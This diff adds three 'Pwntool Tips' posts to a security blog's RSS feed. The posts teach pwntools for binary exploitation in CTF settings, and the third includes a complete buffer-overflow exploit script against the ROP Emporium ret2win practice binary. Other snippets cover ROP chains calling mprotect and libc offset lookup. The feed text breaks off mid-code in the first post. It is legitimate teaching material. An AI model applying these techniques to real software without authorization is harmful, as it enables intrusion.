@@ -5,8 +5,309 @@
         <description>Recent content in Posts on [audible]blink</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 28 Dec 2019 21:59:34 -0500</lastBuildDate>
+        <lastBuildDate>Sat, 04 Jan 2020 19:13:37 -0500</lastBuildDate>
         <atom:link href="https://sec.alexflor.es/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Pwntool Tips 3</title>
+            <link>https://sec.alexflor.es/posts/2020/01/pwntool-tips-3/</link>
+            <pubDate>Sat, 04 Jan 2020 19:13:37 -0500</pubDate>
+            
+            <guid>https://sec.alexflor.es/posts/2020/01/pwntool-tips-3/</guid>
+            <description>Before we start, in part 2 of the series, I demonstrated finding instructions within a binary using elf.search. I passed &amp;quot;\xff\e4&amp;quot; in order to find the address of some jmp rsp instructions. Turns out, just can also use the mnemonics if we pass them through asm() first.
+&amp;#34;&amp;#34;&amp;#34;From yesterday &amp;#34;&amp;#34;&amp;#34; In [2]: e = ELF(&amp;#39;pwnable&amp;#39;) In [3]: next(e.search(&amp;#34;\xff\xe4&amp;#34;)) Out[3]: 159281 &amp;#34;&amp;#34;&amp;#34;Alternate way, with mnenonic &amp;#34;&amp;#34;&amp;#34; In [2]: searcher = e.search( asm(&amp;#34;jmp rsp&amp;#34;) ) In [3]: searcher.</description>
+            <content type="html"><![CDATA[<p>Before we start, in part 2 of the series, I demonstrated  finding instructions within a binary
+using <code>elf.search</code>. I passed <code>&quot;\xff\e4&quot;</code> in order to find the address of some <code>jmp rsp</code>
+instructions. Turns out, just can also use the mnemonics if we pass them through <code>asm()</code> first.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> From yesterday </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#39;</span>)
+In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#ae81ff">\xe4</span><span style="color:#e6db74">&#34;</span>))
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
+
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> Alternate way, with mnenonic </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+In [<span style="color:#ae81ff">2</span>]: searcher <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>search( asm(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">jmp rsp</span><span style="color:#e6db74">&#34;</span>) )
+In [<span style="color:#ae81ff">3</span>]: searcher<span style="color:#f92672">.</span>next()
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
+
+
+</code></pre></div><h1 id="autofind-your-offset-with-cyclic-and-corefiles">Auto-Find Your Offset with Cyclic and Corefiles</h1>
+<p>The <code>cyclic</code> function will generate a deterministic sequence called a
+<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn</a>
+sequence. Since the pattern is always the same, we can take the sequence at the fault address and
+search for the offset within that sequence.</p>
+<p><code>Pwntools</code> also knows how to deal with core dumps.</p>
+<p>From the <a href="http://docs.pwntools.com/en/stable/elf/corefile.html#using-corefiles-to-automate-exploitation">Docs</a>:</p>
+<blockquote>
+<p>Core dumps are extremely useful when writing exploits, even outside of the normal act of debugging things.</p>
+</blockquote>
+<p>We're going use the first 64-bit challenge from
+<a href="https://ropemporium.com/challenge/ret2win.html">ROP Emporium</a>.
+The challenges here are specifically geared toward practicing ROP techniques, so they tell you
+outright that the overflow length for every challenge is 40. We'll use the known-good value to
+test with.</p>
+<p>To automatically find the offset:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>)
+In [<span style="color:#ae81ff">3</span>]: io <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ret2win</span><span style="color:#e6db74">&#39;</span>)
+In [<span style="color:#ae81ff">4</span>]: prompt <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
+In [<span style="color:#ae81ff">5</span>]: io<span style="color:#f92672">.</span>sendline(cyclic(<span style="color:#ae81ff">128</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+In [<span style="color:#ae81ff">6</span>]: io<span style="color:#f92672">.</span>wait()
+[<span style="color:#f92672">*</span>] Process <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ret2win</span><span style="color:#e6db74">&#39;</span> stopped <span style="color:#66d9ef">with</span> exit code <span style="color:#f92672">-</span><span style="color:#ae81ff">11</span> (SIGSEGV) (pid <span style="color:#ae81ff">1108287</span>)
+
+In [<span style="color:#ae81ff">7</span>]: c <span style="color:#f92672">=</span> Core(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./core.ret2win.1108287</span><span style="color:#e6db74">&#34;</span>)
+[x] Parsing corefile<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
+    Arch:      amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+    RIP:       <span style="color:#ae81ff">0x400810</span>
+    RSP:       <span style="color:#ae81ff">0x7ffcef76b438</span>
+    Fault:     <span style="color:#ae81ff">0x6161616161616166</span>
+
+In [<span style="color:#ae81ff">8</span>]: cyclic_find(c<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+Out[<span style="color:#ae81ff">8</span>]: <span style="color:#ae81ff">40</span>
+</code></pre></div><p>Here's what a fully automated exploit might look like using what we've learned from the past 3
+posts.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">overflow</span>(io, data):
+    io<span style="color:#f92672">.</span>recv()
+    io<span style="color:#f92672">.</span>sendline(data)
+
+exe <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ret2win</span><span style="color:#e6db74">&#34;</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>
+io <span style="color:#f92672">=</span> process(exe)
+
+pattern <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">100</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+overflow(io, pattern)
+io<span style="color:#f92672">.</span>wait()
+
+offset <span style="color:#f92672">=</span> cyclic_find( io<span style="color:#f92672">.</span>corefile<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
+
+elf <span style="color:#f92672">=</span> ELF(exe)
+payload <span style="color:#f92672">=</span> fit({ offset: elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>ret2win })
+
+io <span style="color:#f92672">=</span> process(exe)
+overflow(io, payload)
+success( io<span style="color:#f92672">.</span>recvline()  )
+</code></pre></div><p>Output:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">dev ❯❯ python exp.py
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248672</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./ret2win&#39;</span> stopped with exit code -11 <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>pid 1248672<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Parsing corefile...: Done
+    Arch:      amd64-64-little
+    RIP:       0x400810
+    RSP:       0x7ffcf9977c28
+    Fault:     0x6161616161616166
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248677</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> b<span style="color:#e6db74">&#34;Thank you! Here&#39;s your flag:ROPE{a_placeholder_32byte_flag!}\n&#34;</span>
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>Pwntool Tips 2</title>
+            <link>https://sec.alexflor.es/posts/2020/01/pwntool-tips-2/</link>
+            <pubDate>Fri, 03 Jan 2020 13:13:01 -0500</pubDate>
+            
+            <guid>https://sec.alexflor.es/posts/2020/01/pwntool-tips-2/</guid>
+            <description>ELF and ROP Modules Pwntools gives us the ability to interact with ELFs and shared libraries in a programmatic way.
+ Full ELF docs Full ROP docs  ELF fit One of the Class-level members I want to talk about is fit. I&#39;ve had to create lines in my exploit code that look like this:
+buf_len = 128 pad_len = buf_len - (len(gadgets) + len(mprotect)) payload = gadgets payload += mprotect payload += &amp;#34;A&amp;#34; * pad_len payload += canary payload += &amp;#34;A&amp;#34; * 16 # junk payload += jmprsp fit allows you to be declarative about where each of your exploit components should be in your payload.</description>
+            <content type="html"><![CDATA[<h1 id="elf-and-rop-modules">ELF and ROP Modules</h1>
+<p>Pwntools gives us the ability to interact with ELFs and shared libraries in a programmatic way.</p>
+<ul>
+<li>Full <a href="http://docs.pwntools.com/en/stable/elf/elf.html">ELF docs</a></li>
+<li>Full <a href="http://docs.pwntools.com/en/stable/rop/rop.html">ROP docs</a></li>
+</ul>
+<h2 id="elf">ELF</h2>
+<h3 id="fit">fit</h3>
+<p>One of the Class-level members I want to talk about is <code>fit</code>. I've had to create lines in my
+exploit code that look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>
+pad_len <span style="color:#f92672">=</span> buf_len <span style="color:#f92672">-</span> (len(gadgets) <span style="color:#f92672">+</span> len(mprotect))
+
+payload  <span style="color:#f92672">=</span> gadgets
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> mprotect
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> pad_len
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> canary
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#75715e"># junk</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> jmprsp
+</code></pre></div><p><code>fit</code> allows you to be declarative about where each of your exploit components should be in your
+payload.</p>
+<p>The same payload, using <code>fit</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> fit({
+        <span style="color:#ae81ff">0</span>: gadgets,
+        <span style="color:#ae81ff">8</span>: mprotect,
+        <span style="color:#ae81ff">128</span>: canary,
+        <span style="color:#ae81ff">144</span>: jmprsp
+    })
+</code></pre></div><p>All padding between the declared sections is inserted for you. Bonus, it uses the same pattern
+that <code>cyclic</code> uses, so if your binary crashes during the exploit, the resulting address in the
+crash screen of GDB can be inserted into <code>cyclic_find</code> and it will tell you where the cause of the
+crash is in your payload. Much like using <code>pattern_create</code> to find an initial buffer length. I'll
+go into <code>cyclic</code> in another blog post.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: exp <span style="color:#f92672">=</span> fit({
+   <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>:     <span style="color:#ae81ff">4</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ZZZZ</span><span style="color:#e6db74">&#34;</span>,
+   <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>:     <span style="color:#ae81ff">12</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">XXXX</span><span style="color:#e6db74">&#34;</span>
+   <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>: })
+
+In [<span style="color:#ae81ff">3</span>]: exp
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">aaaaZZZZcaaaXXXX</span><span style="color:#e6db74">&#39;</span>
+</code></pre></div><h3 id="symbols">symbols</h3>
+<p><code>symbols</code> will return a <code>dotdict</code> of symbol-to-address mappings. <code>sym</code> is a convenience
+alias to <code>symbols</code>. A <code>dotdict</code> is a class within <code>pwntools</code> that allows dotted access to the
+underlying python <code>dict</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#34;</span>)
+In [<span style="color:#ae81ff">3</span>]: e<span style="color:#f92672">.</span>symbols
+Out[<span style="color:#ae81ff">3</span>]:
+{<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__gmon_start__</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4207552</span>,
+ <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__libc_start_main</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4207544</span>,
+ <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>snip<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
+ <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">read</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198480</span>,
+ <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">setvbuf</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198512</span>,
+ <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">stdout</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4207640</span>,
+ <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">strcmp</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198496</span>,
+ <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">strlen</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198444</span>}
+
+In [<span style="color:#ae81ff">4</span>]: e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read
+Out[<span style="color:#ae81ff">4</span>]: <span style="color:#ae81ff">4198480</span>
+</code></pre></div><h3 id="search">search</h3>
+<p><code>search</code> takes a sequence of bytes and returns an iterator of possible matches. Handy if you want
+to get the location of say &ldquo;/bin/sh&rdquo; inside of <code>libc</code>, or even just to find specific instructions
+you might want to use in your payload.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/lib/libc.so.6</span><span style="color:#e6db74">&#39;</span>)
+In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>))
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">1618340</span>
+</code></pre></div><p>Finding a JMP RSP (<code>ff e4</code>) instruction:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#39;</span>)
+In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#ae81ff">\xe4</span><span style="color:#e6db74">&#34;</span>))
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
+</code></pre></div><h2 id="rop">ROP</h2>
+<p>The ROP module facilitates creating ROP chains by creating a python-style call API of sorts for
+calling symbols located in the binary. We'll use <code>mprotect</code> for our example.</p>
+<p>From <code>man 3 mprotect</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">NAME
+       mprotect — set protection of memory mapping
+
+SYNOPSIS
+       #include &lt;sys/mman.h&gt;
+       int mprotect(void *addr, size_t len, int prot);
+</code></pre></div><h3 id="call">call</h3>
+<p>Call will allow you to call the symbol you designate as the first param, and take subsequent
+arguments to the callee as a list. The function doesn't return anything, but modifies the
+instance of the ROP class. This allows for you to continue to chain more calls together. Once
+you're ready, you can <code>bytes(rop)</code> or <code>rop.chain()</code> to get the resulting payload. As a convenience,
+symbols are also directly callable from the <code>ROP</code> instance.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>
+In [<span style="color:#ae81ff">3</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./haxme</span><span style="color:#e6db74">&#39;</span>)
+
+In [<span style="color:#ae81ff">4</span>]: rop<span style="color:#f92672">.</span>dump()
+Out[<span style="color:#ae81ff">4</span>]: <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+
+In [<span style="color:#ae81ff">5</span>]: rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">mprotect</span><span style="color:#e6db74">&#39;</span>, [<span style="color:#ae81ff">0x12345678</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x7</span>])
+
+In [<span style="color:#ae81ff">6</span>]: <span style="color:#66d9ef">print</span>(rop<span style="color:#f92672">.</span>dump())
+<span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
+<span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
+<span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
+<span style="color:#ae81ff">0x0018</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
+<span style="color:#ae81ff">0x0020</span>:       <span style="color:#ae81ff">0x12345678</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">305419896</span>
+<span style="color:#ae81ff">0x0030</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
+
+In [<span style="color:#ae81ff">7</span>]: rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1234</span>, <span style="color:#ae81ff">0x100</span>)
+
+In [<span style="color:#ae81ff">8</span>]: <span style="color:#66d9ef">print</span>(rop<span style="color:#f92672">.</span>dump())
+<span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
+<span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
+<span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
+<span style="color:#ae81ff">0x0018</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
+<span style="color:#ae81ff">0x0020</span>:       <span style="color:#ae81ff">0x12345678</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">305419896</span>
+<span style="color:#ae81ff">0x0028</span>:         <span style="color:#ae81ff">0x43bf50</span> mprotect
+<span style="color:#75715e">####</span>
+<span style="color:#ae81ff">0x0030</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
+<span style="color:#ae81ff">0x0038</span>:            <span style="color:#ae81ff">0x100</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
+<span style="color:#ae81ff">0x0040</span>:           <span style="color:#ae81ff">0x1234</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4660</span>
+<span style="color:#ae81ff">0x0048</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
+<span style="color:#ae81ff">0x0050</span>:              <span style="color:#ae81ff">0x0</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#ae81ff">0x0058</span>:         <span style="color:#ae81ff">0x43b3e0</span> read
+</code></pre></div><h3 id="gadgets-and-findgadget"><code>gadgets</code> and <code>find_gadget</code></h3>
+<p>Upon instantiation of a ROP object, you may see log output mention something like &ldquo;Loading
+Gadgets&rdquo;. It's self explanatory. I do want to mention that <code>pwntools</code> gadget finder isn't as
+robust as something like
+<a href="https://github.com/sashs/Ropper">ropper</a>.
+That said, it's still a very helpful and useful function. <code>gadgets</code> contains your dict of gadget
+objects and <code>find_gadget</code> is simply a convenience methods for searching the <code>gadgets</code> dict.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./haxme</span><span style="color:#e6db74">&#39;</span>)
+
+In [<span style="color:#ae81ff">3</span>]: len(rop<span style="color:#f92672">.</span>gadgets)
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">109</span>
+
+In [<span style="color:#ae81ff">4</span>]: gdt <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">pop rsi</span><span style="color:#e6db74">&#34;</span>])
+In [<span style="color:#ae81ff">5</span>]: gdt
+Out[<span style="color:#ae81ff">5</span>]: Gadget(<span style="color:#ae81ff">0x4006ab</span>, [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop rsi</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop r15</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop rbp</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ret</span><span style="color:#e6db74">&#39;</span>], [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">rsi</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r15</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">rbp</span><span style="color:#e6db74">&#39;</span>], <span style="color:#ae81ff">0x10</span>)
+
+In [<span style="color:#ae81ff">6</span>]: gdt<span style="color:#f92672">.</span>address
+Out[<span style="color:#ae81ff">6</span>]: <span style="color:#ae81ff">4196011L</span>
+</code></pre></div><h3 id="srop">SROP</h3>
+<p>When attempting to call something like <code>mprotect</code> in a binary that doesn't explicitly have a symbol
+for it, <code>pwntools</code> will attempt a syscall instead, using SIGRET/SROP. I've written about this
+technique in the past.</p>
+<p><a href="https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/">Abusing Signals with SIGROP</a></p>
+<p>Happy refactoring, and see you next time!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Pwntool Tips 1</title>
+            <link>https://sec.alexflor.es/posts/2020/01/pwntool-tips-1/</link>
+            <pubDate>Thu, 02 Jan 2020 20:56:48 -0500</pubDate>
+            
+            <guid>https://sec.alexflor.es/posts/2020/01/pwntool-tips-1/</guid>
+            <description>Do you like clean exploit scripts? Do you fidget with and refactor them long after you&#39;ve submitted the flag? If so, then this blog series is right up your alley!
+At some point you&#39;ll be developing an exploit that requires you to return to some shared library, most likely libc. Problem is there&#39;s a good chance the libc on your local dev box is not same version as the one on the remote box.</description>
+            <content type="html"><![CDATA[<p>Do you like clean exploit scripts? Do you fidget with and refactor them long after you've submitted
+the flag? If so, then this blog series is right up your alley!</p>
+<p>At some point you'll be developing an exploit that requires you to return to some shared library,
+most likely <code>libc</code>. Problem is there's a good chance the <code>libc</code> on your local dev box is not same
+version as the one on the remote box. You may already know about the <code>libc</code> database <a href="https://github.com/niklasb/libc-database">here on
+GitHub</a>. You'll have to leak a few addresses from the
+remote box in order to be able to search for the right version.</p>
+<p>You can also look up addresses on a webapp that uses the <code>libc</code> database as a backend.
+<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
+<p><img src="2.png" alt="blukat"></p>
+<p>Instead of keeping 2 sets of addresses and offsets (local and remote) you can use the <code>pwnlib.libcdb</code>
+<a href="http://docs.pwntools.com/en/stable/libcdb.html?highlight=libcdb#module-pwnlib.libcdb">Pwntool's module</a></p>
+<p>Once you've identified which <code>libc</code> is on the remote server, you can take its buildid or hash and
+pop it into pwntools. Then you can start rop-chaining or symbol searching right from the comfort of
+your exploit script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leaked_got_read <span style="color:#f92672">=</span> leak_read()
+exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">remote</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv:
+    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
+<span style="color:#66d9ef">else</span>:
